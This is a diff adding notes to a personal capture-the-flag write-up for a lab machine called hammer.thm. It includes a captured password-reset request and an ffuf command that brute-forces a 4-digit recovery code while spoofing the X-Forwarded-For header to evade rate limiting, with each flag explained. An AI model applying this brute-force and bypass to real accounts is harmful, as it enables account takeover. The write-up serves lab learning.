@@ -66,7 +66,59 @@ Visiting http://hammer.thm:1337/hmr_logs:
 
 Shows a web directory with 'error.logs'
 
+Visiting http://hammer.thm:1337/hmr_js
+
+Shows a web directory with Js document; which leads you to a bunch of mess but you can see J query v3.6.0 is not up-
+to date and is vulnerable
+
 
 Possible usernames: tester@hammer.thm
 
 Entering username into forgot password, it accepts and tells me to enter a 4-digit code...
+
+Can't use the Leaking OTP method. Doesn't show up.
+
+I  have cheated and looked at a walkthrough. I need to use burpsuite to grab the SessionID:
+
+
+POST /reset_password.php HTTP/1.1
+Host: hammer.thm:1337
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:152.0) Gecko/20100101 Firefox/152.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: en-US,en;q=0.9
+Accept-Encoding: gzip, deflate, br
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 25
+Origin: http://hammer.thm:1337
+Connection: keep-alive
+Referer: http://hammer.thm:1337/reset_password.php
+Cookie: PHPSESSID=1qe08dop1779tnqtuoqcnnk4sr
+Upgrade-Insecure-Requests: 1
+Priority: u=0, i
+
+email=tester%40hammer.thm
+
+
+PHPSESSID: 1qe08dop1779tnqtuoqcnnk4sr
+
+According to the Walkthrough, we should use "Ffuf" again.
+
+ffuf -w numbers.txt -u "http://10.145.148.198:1337/reset_password.php" -X "POST" -d "recovery_code=FUZZ&s=60" -H "Cookie: PHPSESSID=3u2ms637t9s7t7nr8p3u220u1k" 
+-H "X-Forwarded-For: FUZZ" -H "Content-Type: application/x-www-form-urlencoded" -fr "Invalid" -s
+
+What does this do?
+
+-d "recovery_code=FUZZ&s=60": This is the POST data. The value "FUZZ" will be replaced with each entry from the wordlist.
+
+-H "Cookie: PHPSESSID=3u2ms637t9s7t7nr8p3u220u1k": This adds a session cookie to the request, to stay logged in.
+
+-H "X-Forwarded-For: FUZZ": This sets the "X-Forwarded-For" header, and uses FUZZ again. This is often done to bypass rate limiting by spoofing the client IP address.
+
+-H "Content-Type: application/x-www-form-urlencoded": Sets the content type to form data, which is required for POST requests with form fields.
+
+-fr "Invalid": This tells ffuf to filter out any responses that contain the word "Invalid". Only responses that do not contain this word will be shown.
+
+-s: Silent mode. It hides unnecessary output and only shows the results.
+
+
+I was able to enter the session cookie and reset password.
